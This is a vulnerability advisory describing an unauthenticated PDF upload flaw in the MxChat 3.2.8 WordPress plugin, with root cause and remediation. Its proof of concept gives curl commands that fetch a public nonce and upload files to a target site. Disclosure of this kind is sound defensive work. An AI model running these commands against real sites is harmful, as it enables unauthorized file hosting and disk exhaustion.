# MxChat 3.2.8 Unauthenticated Arbitrary PDF Upload via Publicly Exposed Nonce

## Summary

MxChat 3.2.8 allows unauthenticated users to upload PDF files to the server by obtaining a valid nonce from a publicly accessible REST API endpoint. Uploaded files are stored permanently within the WordPress uploads directory and are publicly accessible over HTTP.

An attacker can repeatedly upload large PDF files without authentication, leading to unauthorized file hosting and potential disk-space exhaustion.

**Severity:** High

**CVSS v3.1:** 8.2 (Suggested)
**Vector:** CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:H

## Affected Product

* MxChat 3.2.8
* WordPress Plugin: MxChat – AI Chatbot & Content Generation for WordPress

## Vulnerability Details

The plugin exposes a public REST API endpoint:

```text
/wp-json/mxchat/v1/nonce
```

This endpoint returns a valid nonce to unauthenticated users.

The returned nonce can then be supplied to the unauthenticated AJAX handler:

```text
action=mxchat_upload_pdf
```

allowing an attacker to upload PDF files without authentication.

Uploaded files are saved inside:

```text
wp-content/uploads/YYYY/MM/
```

and remain publicly accessible.

Because there is no authentication requirement, an attacker can repeatedly upload large PDF files, causing storage consumption and using the affected site as a public file-hosting service.

## Impact

An unauthenticated attacker can:

* Upload arbitrary PDF files
* Store attacker-controlled content on the server
* Access uploaded files publicly
* Repeatedly upload large files
* Consume disk space
* Abuse the website as a file hosting platform

No administrator interaction is required.

## Proof of Concept

### Step 1: Obtain a nonce

```bash
curl -s http://TARGET/wp-json/mxchat/v1/nonce
```

Example response:

```json
{
  "nonce": "d2185bf023",
  "expires_in": 86400
}
```

### Step 2: Create a PDF

```bash
python3 - <<'PY'
from reportlab.pdfgen import canvas
c = canvas.Canvas("poc.pdf")
c.drawString(100,750,"MxChat PoC")
c.save()
PY
```

### Step 3: Upload the PDF without authentication

```bash
curl -X POST http://TARGET/wp-admin/admin-ajax.php \
-F "action=mxchat_upload_pdf" \
-F "nonce=NONCE_VALUE" \
-F "session_id=poc123" \
-F "pdf_file=@poc.pdf;type=application/pdf"
```

### Response

```json
{
  "success": true,
  "data": {
    "message": "I've processed the PDF. What questions do you have about it?",
    "filename": "poc.pdf"
  }
}
```

### Step 4: Verify file storage

Example uploaded file location:

```text
wp-content/uploads/2026/06/mxchat_aZ2skfSErNt3BNE9VlQc_1780582505.pdf
```

### Step 5: Verify public access

```bash
curl -I http://TARGET/wp-content/uploads/2026/06/mxchat_aZ2skfSErNt3BNE9VlQc_1780582505.pdf
```

Example response:

```text
HTTP/1.1 200 OK
Content-Type: application/pdf
```

## Root Cause

The plugin exposes a nonce generation endpoint to unauthenticated users and accepts that nonce in an unauthenticated upload handler. The upload functionality does not require authentication before processing and storing user-supplied PDF files.

## Suggested Remediation

* Require authentication before allowing file uploads.
* Remove unauthenticated access to upload functionality.
* Restrict nonce issuance to authorized users.
* Enforce capability checks before processing uploaded files.
* Consider limiting upload size and upload frequency.
* Remove or restrict public access to uploaded processing files.

## Credits

Discovered and reported by Vaibhav Narkhede.
